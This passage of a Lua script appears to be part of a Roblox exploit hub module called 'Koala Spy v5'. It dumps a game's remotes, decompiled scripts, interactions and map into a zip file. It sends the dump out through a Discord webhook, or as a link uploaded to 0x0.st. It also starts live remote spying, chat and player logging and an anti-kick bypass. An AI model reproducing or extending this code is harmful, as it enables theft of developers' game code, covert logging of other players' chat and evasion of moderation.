    resumo.mapaMB = 0
    if AUTO_MAPA and saveinstance then
        notify("Salvando mapa...", 3)
        local dados, nomeArq = salvarMapa()
        if dados then
            if #dados <= MAX_UPLOAD then
                table.insert(arquivos, { nome = "08_" .. nomeArq, dados = dados })
                resumo.mapaMB = #dados / 1048576
            else
                resumo.mapaMB = #dados / 1048576
                resumo.mapaGrandeDemais = true
            end
        end
    end

    --==== envio: 1) ZIP unico  2) link 0x0.st  3) separado (fallback)
    local textoResumo = table.concat({
        "**[Koala Spy] DUMP COMPLETO**",
        "```",
        resumo.sessao,
        string.rep("-", 40),
        string.format("Remotes: %d (%d quentes) | Instancias: %d | Scripts: %d",
            resumo.remotes, resumo.quentes, resumo.instancias, resumo.scripts),
        string.format("Interacoes: %d prompts / %d clicks / %d touches",
            resumo.prompts, resumo.clicks, resumo.touches),
        string.format("Fontes decompiladas: %d (falhas: %d) | Mapa: %.1f MB%s",
            resumo.decompilados, resumo.falhasDecompile, resumo.mapaMB,
            resumo.mapaGrandeDemais and " (grande demais, fora do pacote)" or ""),
        "```",
    }, "\n")

    notify("Montando pacote unico (.zip)...", 3)

    -- salva tudo local tambem
    for _, a in ipairs(arquivos) do salvarLocal(a.nome, a.dados) end

    local zipOk, zip = pcall(Zip.montar, arquivos)
    if zipOk and zip and #zip > 0 then
        local nomeZip = string.format("koala_dump_%d.zip", game.PlaceId)
        salvarLocal(nomeZip, zip)
        if #zip <= MAX_UPLOAD then
            local ok, err = postWebhookFile(nomeZip, zip, textoResumo .. string.format(
                "\n**Pacote unico: %d arquivos, %.1f MB (.zip)**", #arquivos, #zip / 1048576))
            if ok then
                notify(string.format("Dump enviado: 1 arquivo .zip (%.1f MB).", #zip / 1048576), 5)
                return "zip"
            end
            notify("ZIP falhou no Discord (" .. tostring(err) .. ") — tentando link...", 4)
        end
        -- zip grande demais ou discord recusou -> 0x0.st
        notify("Subindo no 0x0.st (gera link)...", 4)
        local link, errL = uploadLink(nomeZip, zip)
        if link then
            postWebhook(textoResumo .. string.format(
                "\n**Pacote (%.1f MB, %d arquivos):** %s\n(expira em ~30 dias, 1 link pra tudo)",
                #zip / 1048576, #arquivos, link))
            notify("Dump enviado via LINK — confere o Discord.", 5)
            return "link"
        end
        notify("0x0.st falhou (" .. tostring(errL) .. ") — enviando separado...", 4)
    end

    -- fallback: separado
    postWebhook(textoResumo .. "\n*(envio separado — pacote unico indisponivel)*")
    for i, a in ipairs(arquivos) do
        if #a.dados <= MAX_UPLOAD then
            postWebhookFile(string.format("koala_%d_%s", game.PlaceId, a.nome), a.dados,
                string.format("**[%d/%d]** %s", i, #arquivos, a.nome))
            task.wait(1.5)
        else
            local link = uploadLink(a.nome, a.dados)
            if link then
                postWebhook(string.format("**[%d/%d]** %s: %s", i, #arquivos, a.nome, link))
            end
        end
    end
    notify("Dump enviado em arquivos separados.", 4)
    return "separado"
end

--==================================================================--
--  LOG DO SPY (manual)
--==================================================================--
local function enviarLogSessao()
    if #logSessao == 0 then return notify("Log vazio — nada capturado ainda.", 3) end
    local conteudo = "KOALA SPY — LOG DE SESSAO\n" .. infoSessao() .. "\n"
        .. string.rep("-", 60) .. "\n" .. table.concat(logSessao, "\n")
    local nome = "koala_spy_log_" .. os.time() .. ".txt"
    salvarLocal(nome, conteudo)
    local ok, err = postWebhookFile(nome, conteudo,
        "**[Koala Spy] Log da sessao — " .. #logSessao .. " eventos**")
    notify(ok and "Log enviado!" or ("Falha: " .. tostring(err)), 3)
end

--==================================================================--
--  BOOT
--==================================================================--
if not _G.KoalaSpyBooted then
    _G.KoalaSpyBooted = true

    -- loop de envio em lote do spy ao vivo
    task.spawn(function()
        while true do
            task.wait(INTERVALO_FILA)
            if #fila > 0 and not enviando then
                enviando = true
                local lote = {}
                while #fila > 0 do
                    local parte = table.remove(fila, 1)
                    local atual = table.concat(lote, "\n")
                    if #atual + #parte + 1 > MAX_MSG then
                        table.insert(fila, 1, parte)
                        break
                    end
                    table.insert(lote, parte)
                end
                if #lote > 0 then postWebhook(table.concat(lote, "\n")) end
                enviando = false
            end
        end
    end)

    task.spawn(function()
        task.wait(2)

        local spyOutOk = ligarSpyOut()
        local nIn = ligarSpyIn()
        ligarChatLog()
        ligarPlayerWatcher()
        local antiKickOk = ligarAntiKick()

        postWebhook("**[Koala Spy] SESSAO INICIADA**\n```\n" .. infoSessao() .. "\n```")
        notify("Koala Spy v5 ativo — coletando tudo...", 5)

        local modo = dumpCompleto()

        notify(string.format(
            "Dump pronto (%s). Spy OUT %s | IN: %d remotes | Anti-kick %s",
            modo, spyOutOk and "ON" or "OFF", nIn, antiKickOk and "ON" or "OFF"), 6)
    end)
end

--==================================================================--
--  RETORNO: aba "Spy" na UI do hub (standalone ignora)
--==================================================================--
return function(Koala, Window, Flags)
    if Flags then
        if Flags.SpyAtivo ~= nil then State.spyAtivo = Flags.SpyAtivo end
        Flags.SpyAtivo = State.spyAtivo
    end
    if not Window then return end

    local ok, err = pcall(function()
        local SpyTab = Window:Tab({ Title = "Spy", Icon = "radar" })

        SpyTab:Paragraph({
            Title = "Koala Spy v5",
            Desc = "Dump unico (.zip) com remotes+analise, arvore, fontes, interacoes, dados, UI e mapa. Spy ao vivo de ida E volta, chat, players e anti-kick.",
        })

        SpyTab:Toggle({
            Title = "Spy ao vivo (OUT + IN)",
            Value = State.spyAtivo,
            Callback = function(v)
                State.spyAtivo = v
                if Flags then Flags.SpyAtivo = v end
                notify(v and "Spy ligado." or "Spy pausado.", 2)
            end,
        })

        SpyTab:Button({
            Title = "Refazer DUMP completo (.zip)",
            Callback = function()
                task.spawn(function()
                    local modo = dumpCompleto()
                    notify("Dump enviado (" .. modo .. ").", 3)
                end)
            end,
        })

        SpyTab:Button({
            Title = "Enviar LOG da sessao (.txt)",
            Callback = function() task.spawn(enviarLogSessao) end,
        })

        SpyTab:Paragraph({
            Title = "Contadores ao vivo",
            Desc = "OUT: 0 | IN: 0 | CHAT: 0",
        })
    end)
    if not ok then
        warn("[KoalaSpy] aba da UI nao criada: " .. tostring(err))
    end
end
